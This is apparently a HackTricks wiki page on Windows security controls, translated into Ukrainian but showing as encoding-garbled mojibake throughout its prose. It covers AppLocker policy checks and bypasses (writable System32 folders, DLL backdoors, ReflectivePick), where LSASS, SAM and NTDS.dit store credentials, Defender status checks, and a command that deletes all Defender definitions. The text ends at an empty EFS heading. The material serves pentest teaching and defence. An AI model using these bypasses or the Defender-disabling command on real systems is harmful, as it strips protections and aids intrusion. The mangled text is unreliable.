# –ö–æ–Ω—Ç—Ä–æ–ª—ñ –±–µ–∑–ø–µ–∫–∏ Windows

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) –¥–ª—è –ª–µ–≥–∫–æ—ó –ø–æ–±—É–¥–æ–≤–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏** —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## –ü–æ–ª—ñ—Ç–∏–∫–∞ AppLocker

–ë—ñ–ª–∏–π —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º - —Ü–µ —Å–ø–∏—Å–æ–∫ —Å—Ö–≤–∞–ª–µ–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º –∞–±–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—î—Ç—å—Å—è –ø—Ä–∏—Å—É—Ç–Ω—ñ–º —Ç–∞ –∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ. –ú–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ –∑–∞—Ö–∏—Å—Ç—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –≤—ñ–¥ —à–∫—ñ–¥–ª–∏–≤–∏—Ö –ø—Ä–æ–≥—Ä–∞–º-—à–ø–∏–≥—É–Ω—ñ–≤ —Ç–∞ –Ω–µ–¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º, —è–∫—ñ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º –±—ñ–∑–Ω–µ—Å-–ø–æ—Ç—Ä–µ–±–∞–º –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) - —Ü–µ **—Ä—ñ—à–µ–Ω–Ω—è –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –ø—Ä–æ–≥—Ä–∞–º** –≤—ñ–¥ Microsoft, —è–∫–µ –¥–∞—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º —Å–∏—Å—Ç–µ–º –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ **–ø—Ä–æ–≥—Ä–∞–º–∞–º–∏ —Ç–∞ —Ñ–∞–π–ª–∞–º–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ**. –í–æ–Ω–æ –∑–∞–±–µ–∑–ø–µ—á—É—î **–¥–µ—Ç–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å** –Ω–∞–¥ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–º–∏ —Ñ–∞–π–ª–∞–º–∏, —Å–∫—Ä–∏–ø—Ç–∞–º–∏, —Ñ–∞–π–ª–∞–º–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ Windows, DLL-–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞–º–∏, —É–ø–∞–∫–æ–≤–∞–Ω–∏–º–∏ –ø—Ä–æ–≥—Ä–∞–º–∞–º–∏ —Ç–∞ –ø—Ä–æ–≥—Ä–∞–º–∞–º–∏ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —É–ø–∞–∫–æ–≤–∞–Ω–∏—Ö –ø—Ä–æ–≥—Ä–∞–º.\
–ó–∞–∑–≤–∏—á–∞–π –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó **–±–ª–æ–∫—É—é—Ç—å cmd.exe —Ç–∞ PowerShell.exe** —Ç–∞ –¥–æ—Å—Ç—É–ø –Ω–∞ –∑–∞–ø–∏—Å –¥–æ –ø–µ–≤–Ω–∏—Ö –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, **–∞–ª–µ –≤—Å–µ —Ü–µ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏**.

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫—ñ —Ñ–∞–π–ª–∏/—Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–±—É–≤–∞—é—Ç—å —É —á–æ—Ä–Ω–æ–º—É/–±—ñ–ª–æ–º—É —Å–ø–∏—Å–∫—É:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
–¶–µ–π —à–ª—è—Ö —Ä–µ—î—Å—Ç—Ä—É –º—ñ—Å—Ç–∏—Ç—å –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏, —è–∫—ñ –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—Ç—å—Å—è AppLocker, –Ω–∞–¥–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π –Ω–∞–±—ñ—Ä –ø—Ä–∞–≤–∏–ª, —è–∫—ñ –¥—ñ—é—Ç—å –≤ —Å–∏—Å—Ç–µ–º—ñ:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### –û–±—Ö—ñ–¥

* –ö–æ—Ä–∏—Å–Ω—ñ **–ü–∞–ø–∫–∏ –¥–ª—è –∑–∞–ø–∏—Å—É**, —â–æ–± –æ–±—ñ–π—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫—É AppLocker: –Ø–∫—â–æ AppLocker –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±—É–¥—å-—â–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `C:\Windows\System32` –∞–±–æ `C:\Windows`, —î **–ø–∞–ø–∫–∏ –¥–ª—è –∑–∞–ø–∏—Å—É**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–æ–±—Ö–æ–¥—É —Ü—å–æ–≥–æ**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* –ó–∞–∑–≤–∏—á–∞–π **–¥–æ–≤—ñ—Ä—è—é—Ç—å—Å—è** [**"LOLBAS's"**](https://lolbas-project.github.io/) –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º–∏ –¥–ª—è –æ–±—Ö—ñ–¥—É AppLocker.
* **–ü–æ–≥–∞–Ω–æ –Ω–∞–ø–∏—Å–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±—Ö—ñ–¥–Ω–∏–º–∏**
* –ù–∞–ø—Ä–∏–∫–ª–∞–¥, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–ø–∞–ø–∫—É –∑ –Ω–∞–∑–≤–æ—é `allowed`** –¥–µ –∑–∞–≤–≥–æ–¥–Ω–æ, —ñ –≤–æ–Ω–∞ –±—É–¥–µ –¥–æ–∑–≤–æ–ª–µ–Ω–∞.
* –û—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó —á–∞—Å—Ç–æ —Ñ–æ–∫—É—Å—É—é—Ç—å—Å—è –Ω–∞ **–±–ª–æ–∫—É–≤–∞–Ω–Ω—ñ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, –∞–ª–µ –∑–∞–±—É–≤–∞—é—Ç—å –ø—Ä–æ **—ñ–Ω—à—ñ** [**—Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) —Ç–∞–∫—ñ —è–∫ `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` –∞–±–æ `PowerShell_ISE.exe`.
* **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è DLL –º–∞–π–∂–µ –Ω—ñ–∫–æ–ª–∏ –Ω–µ —É–≤—ñ–º–∫–Ω–µ–Ω–µ** —á–µ—Ä–µ–∑ –¥–æ–¥–∞—Ç–∫–æ–≤–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –Ω–∞ —Å–∏—Å—Ç–µ–º—É —Ç–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ç–µ—Å—Ç—É–≤–∞–Ω—å, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Ç–æ–≥–æ, —â–æ –Ω—ñ—á–æ–≥–æ –Ω–µ –∑–ª–∞–º–∞—î—Ç—å—Å—è. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **DLL —è–∫ –∑–∞–¥–Ω—ñ—Ö –¥–≤–µ—Ä–µ–π –¥–æ–ø–æ–º–æ–∂–µ –æ–±—ñ–π—Ç–∏ AppLocker**.
* –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) –∞–±–æ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É Powershell** –≤ –±—É–¥—å-—è–∫–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ —Ç–∞ –æ–±—Ö–æ–¥—É AppLocker. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## –ó–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

### –ú–µ–Ω–µ–¥–∂–µ—Ä –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –±–µ–∑–ø–µ–∫–∏ (SAM)

–õ–æ–∫–∞–ª—å–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –ø—Ä–∏—Å—É—Ç–Ω—ñ –≤ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ, –ø–∞—Ä–æ–ª—ñ –∑–∞—Ö–µ—à–æ–≤–∞–Ω—ñ.

### –õ–æ–∫–∞–ª—å–Ω–∞ —Å–ª—É–∂–±–∞ –±–µ–∑–ø–µ–∫–∏ (LSA) - LSASS

**–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** (–∑–∞—Ö–µ—à–æ–≤–∞–Ω—ñ) **–∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è** –≤ **–ø–∞–º'—è—Ç—ñ** —Ü—ñ—î—ó –ø—ñ–¥—Å–∏—Å—Ç–µ–º–∏ –∑ –º–µ—Ç–æ—é –æ–¥–Ω–æ—Ä–∞–∑–æ–≤–æ–≥–æ –≤—Ö–æ–¥—É.\
**LSA** –∫–µ—Ä—É—î –ª–æ–∫–∞–ª—å–Ω–æ—é **–ø–æ–ª—ñ—Ç–∏–∫–æ—é –±–µ–∑–ø–µ–∫–∏** (–ø–æ–ª—ñ—Ç–∏–∫–∞ –ø–∞—Ä–æ–ª—ñ–≤, –¥–æ–∑–≤–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤...), **–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—î—é**, **—Ç–æ–∫–µ–Ω–∞–º–∏ –¥–æ—Å—Ç—É–ø—É**...\
LSA –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –Ω–∞–¥–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É **SAM** (–¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤—Ö–æ–¥—É) —Ç–∞ **—Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è** –∑ **–∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–æ–º –¥–æ–º–µ–Ω—É** –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ–º–µ–Ω—É.

**–û–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–ø—Ä–æ—Ü–µ—Å—É LSASS**: –∫–≤–∏—Ç–∫–∏ Kerberos, —Ö–µ—à—ñ NT —Ç–∞ LM, –ª–µ–≥–∫–æ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –ø–∞—Ä–æ–ª—ñ.

### –°–µ–∫—Ä–µ—Ç–∏ LSA

LSA –º–æ–∂–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –Ω–∞ –¥–∏—Å–∫—É –¥–µ—è–∫—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ:

* –ü–∞—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∫–æ–º–ø'—é—Ç–µ—Ä–∞ Active Directory (–Ω–µ–¥–æ—Å—è–∂–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –¥–æ–º–µ–Ω—É).
* –ü–∞—Ä–æ–ª—ñ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–± Windows
* –ü–∞—Ä–æ–ª—ñ –¥–ª—è –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å
* –©–µ (–ø–∞—Ä–æ–ª—å –¥–æ–¥–∞—Ç–∫—ñ–≤ IIS...)

### NTDS.dit

–¶–µ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö Active Directory. –í–æ–Ω–∞ –ø—Ä–∏—Å—É—Ç–Ω—è –ª–∏—à–µ –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞—Ö –¥–æ–º–µ–Ω—É.

## –ó–∞—Ö–∏—Å–Ω–∏–∫

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) - —Ü–µ –∞–Ω—Ç–∏–≤—ñ—Ä—É—Å, —è–∫–∏–π –¥–æ—Å—Ç—É–ø–Ω–∏–π –≤ Windows 10 —Ç–∞ Windows 11, –∞ —Ç–∞–∫–æ–∂ —É –≤–µ—Ä—Å—ñ—è—Ö Windows Server. –í—ñ–Ω **–±–ª–æ–∫—É—î** –∑–∞–≥–∞–ª—å–Ω—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø–µ–Ω—Ç–µ—Å—Ç—ñ–Ω–≥—É, —Ç–∞–∫—ñ —è–∫ **`WinPEAS`**. –û–¥–Ω–∞–∫ —ñ—Å–Ω—É—é—Ç—å —Å–ø–æ—Å–æ–±–∏ **–æ–±—Ö—ñ–¥—É —Ü–∏—Ö –∑–∞—Ö–∏—Å—Ç—ñ–≤**.

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞

–î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ **—Å—Ç–∞–Ω—É** **–ó–∞—Ö–∏—Å–Ω–∏–∫–∞** –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ PS-–∫–æ–º–∞–Ω–¥—É **`Get-MpComputerStatus`** (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–Ω–∞—á–µ–Ω–Ω—è **`RealTimeProtectionEnabled`**, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –≤—ñ–Ω –∞–∫—Ç–∏–≤–Ω–∏–π):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

–î–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∞ —Ñ–∞–π–ª–æ–≤–∞ —Å–∏—Å—Ç–µ–º–∞ (EFS)

EFS –∑–∞—Ö–∏—â–∞—î —Ñ–∞–π–ª–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π –∫–ª—é—á** –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **–ö–ª—é—á —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (FEK)**. –¶–µ–π –∫–ª—é—á –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–ø—É–±–ª—ñ—á–Ω–æ–≥–æ –∫–ª—é—á–∞** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è —É **–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–º—É –ø–æ—Ç–æ—Ü—ñ –¥–∞–Ω–∏—Ö** $EFS –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É. –ü—Ä–∏ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π **–ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á** —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è FEK –∑ –ø–æ—Ç–æ–∫—É $EFS. –î–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–µ—Ç–∞–ª—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://en.wikipedia.org/wiki/Encrypting\_File\_System).

**–°—Ü–µ–Ω–∞—Ä—ñ—ó —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –±–µ–∑ —ñ–Ω—ñ—Ü—ñ–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –≤–∫–ª—é—á–∞—é—Ç—å:

* –ö–æ–ª–∏ —Ñ–∞–π–ª–∏ –∞–±–æ –ø–∞–ø–∫–∏ –ø–µ—Ä–µ–º—ñ—â—É—é—Ç—å—Å—è –Ω–∞ –Ω–µ-EFS —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), –≤–æ–Ω–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—é—Ç—å—Å—è.
* –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É –∑–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–º SMB/CIFS, —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É—é—Ç—å—Å—è –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–¥–∞—á–µ—é.

–¶–µ–π –º–µ—Ç–æ–¥ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î **–ø—Ä–æ–∑–æ—Ä–∏–π –¥–æ—Å—Ç—É–ø** –¥–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –¥–ª—è –≤–ª–∞—Å–Ω–∏–∫–∞. –û–¥–Ω–∞–∫ –ø—Ä–æ—Å—Ç–æ –∑–º—ñ–Ω–∞ –ø–∞—Ä–æ–ª—è –≤–ª–∞—Å–Ω–∏–∫–∞ —Ç–∞ –≤—Ö—ñ–¥ –≤ —Å–∏—Å—Ç–µ–º—É –Ω–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è.

**–û—Å–Ω–æ–≤–Ω—ñ –≤–∏—Å–Ω–æ–≤–∫–∏**:

* EFS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–∏–º–µ—Ç—Ä–∏—á–Ω–∏–π FEK, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—É–±–ª—ñ—á–Ω–æ–≥–æ –∫–ª—é—á–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
* –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ FEK.
* –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –≤ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤–∞—Ö, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–∏ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—ñ –Ω–∞ FAT32 –∞–±–æ –ø–µ—Ä–µ–¥–∞—á—ñ —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É.
* –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ñ–∞–π–ª–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –≤–ª–∞—Å–Ω–∏–∫—É –±–µ–∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∫—Ä–æ–∫—ñ–≤.

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó EFS

